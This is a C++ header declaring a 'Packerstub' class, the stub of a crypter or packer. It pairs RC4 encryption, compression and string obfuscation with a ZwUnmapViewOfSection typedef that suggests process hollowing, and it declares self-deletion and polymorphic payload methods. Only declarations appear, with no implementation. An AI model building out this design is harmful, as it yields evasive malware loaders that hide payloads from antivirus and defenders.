#pragma once
#ifndef __PACKERSTUB_H__
#define __PACKERSTUB_H__

#include <string>

//#include "aes.hpp"
#include "quicklz.hpp"
#include "rc4.hpp"
#include "stringxor.hpp"

#define BUFFER_RSRC_ID 10
#define FILE_SIZE_RSRC_ID 20
#define KEY_RSRC_ID 30

typedef VOID(WINAPI *pfnZwUnmapViewOfProcess)(HANDLE, PVOID);

typedef struct _PAYLOAD {
	LPBYTE lpBuffer;
	DWORD dwBufSize;
	DWORD dwFileSize;
	LPBYTE lpKey;
} PAYLOAD, *LPPAYLOAD;

class Packerstub {
	private:
		LPPAYLOAD lpPayload;
		Rc4 *rc4;
		Quicklz *qlz;
		StringXor *sx;

		bool SelfDelete(std::wstring fileName);
		bool UpdatePayload(std::wstring fileName);

	public:
		Packerstub();
		~Packerstub();
		bool ExtractPayload();
		void DecryptPayload();
		void DecompressPayload();
		bool ExecutePayload();
		bool PolymorphPayload(std::wstring fileName);
};

#endif // !__PACKERSTUB_H__
